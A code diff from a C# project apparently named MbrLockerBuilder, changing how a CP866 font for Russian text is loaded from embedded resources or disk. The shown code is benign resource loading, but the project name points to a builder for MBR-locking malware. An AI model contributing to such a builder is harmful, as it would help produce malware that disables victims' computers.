@@ -322,13 +322,22 @@ namespace MbrLockerBuilder
         }
 
         // ============================================================
-        // ГЕНЕРАЦИЯ ШРИФТА CP866 ИЗ РЕСУРСА
-        // ============================================================
-        private byte[] GenerateCP866Font()
+// ГЕНЕРАЦИЯ ШРИФТА CP866 ИЗ РЕСУРСА (С ПОИСКОМ ПО ЧАСТИ ИМЕНИ)
+// ============================================================
+private byte[] GenerateCP866Font()
+{
+    // ============================================================
+    // МЕТОД 1: Поиск по части имени (как в FindResourceByPartialName)
+    // ============================================================
+    try
+    {
+        string[] allResources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
+        foreach (string name in allResources)
         {
-            try
+            // Ищем любой ресурс, содержащий "cp866_font.bin"
+            if (name.IndexOf("cp866_font.bin", StringComparison.OrdinalIgnoreCase) >= 0)
             {
-                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.cp866_font.bin"))
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
                 {
                     if (stream != null)
                     {
@@ -338,16 +347,55 @@ namespace MbrLockerBuilder
                     }
                 }
             }
-            catch { }
-
-            string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "cp866_font.bin");
-            if (File.Exists(localPath))
-                return File.ReadAllBytes(localPath);
-
-            MessageBox.Show("Шрифт cp866_font.bin не найден! Русский текст будет отображаться неправильно.",
-                "Предупреждение", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-            return new byte[4096];
         }
+    }
+    catch { }
+
+    // ============================================================
+    // МЕТОД 2: Поиск по полному имени (запасной вариант)
+    // ============================================================
+    try
+    {
+        using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.cp866_font.bin"))
+        {
+            if (stream != null)
+            {
+                byte[] font = new byte[4096];
+                stream.Read(font, 0, 4096);
+                return font;
+            }
+        }
+    }
+    catch { }
+
+    // ============================================================
+    // МЕТОД 3: Поиск файла на диске (рядом с EXE)
+    // ============================================================
+    string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "cp866_font.bin");
+    if (File.Exists(localPath))
+        return File.ReadAllBytes(localPath);
+
+    // ============================================================
+    // МЕТОД 4: Поиск файла в папке проекта (для отладки)
+    // ============================================================
+    string projectPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "builder", "Resources", "cp866_font.bin");
+    if (File.Exists(projectPath))
+        return File.ReadAllBytes(projectPath);
+
+    // ============================================================
+    // Если ничего не найдено — предупреждение и пустой шрифт
+    // ============================================================
+    MessageBox.Show(
+        "Шрифт cp866_font.bin не найден!\n\n" +
+        "Русский текст будет отображаться неправильно.\n\n" +
+        "Проверьте, что файл cp866_font.bin добавлен в ресурсы проекта.",
+        "Предупреждение",
+        MessageBoxButtons.OK,
+        MessageBoxIcon.Warning
+    );
+    
+    return new byte[4096];
+}
 
         // ============================================================
         // МЕТОДЫ ДЛЯ ПОДДЕРЖКИ РУССКОГО ЯЗЫКА
